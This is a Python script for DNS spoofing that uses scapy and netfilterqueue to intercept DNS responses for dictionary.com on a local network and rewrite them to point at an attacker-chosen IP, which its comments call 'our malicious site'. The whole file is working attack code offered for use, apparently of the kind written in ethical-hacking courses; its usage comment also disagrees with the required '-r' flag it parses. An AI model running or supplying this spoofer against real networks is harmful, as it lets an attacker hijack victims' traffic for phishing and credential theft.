#!/usr/bin/env python

import argparse
import netfilterqueue
import scapy.all as scapy

'''
        Run the script by providing the required arguments in the following format: 
        
        python dns_spoofer.py 192.168.100.210
        
        The argument is the IP address where you want to redirect the DNS request.
        The script will start intercepting and modifying the DNS responses for dictionary.com.
'''


def process_packet(packet, rdata):
    """Process each packet and spoof if the destination is the target site."""

    # Convert the raw packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    # Check if the packet has a DNS response layer
    if scapy_packet.haslayer(scapy.DNSRR):

        # Extract the queried domain name
        qname = scapy_packet[scapy.DNSQR].qname

        # If the queried domain is our target domain
        if 'dictionary.com' in str(qname):
            print('[+] Spoofing target.')

            # Create a DNS response pointing to our malicious site
            answer = scapy.DNSRR(rrname=qname, rdata=rdata)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Delete the original checksums so scapy can recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Set the packet payload to our modified version
            packet.set_payload(bytes(scapy_packet))

    # Forward the packet
    packet.accept()


def run_spoof(rdata):
    """Create a queue, bind it to the queue number where packets are being held and start the spoofing."""

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, lambda packet: process_packet(packet, rdata))
    queue.run()


if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="DNS Spoofing Script")
    parser.add_argument("-r", "--rdata", dest="rdata", required=True,
                        help="The redirect IP for DNS Spoofing")
    args = parser.parse_args()

    # Run the spoofing attack with the provided redirect IP
    run_spoof(args.rdata)
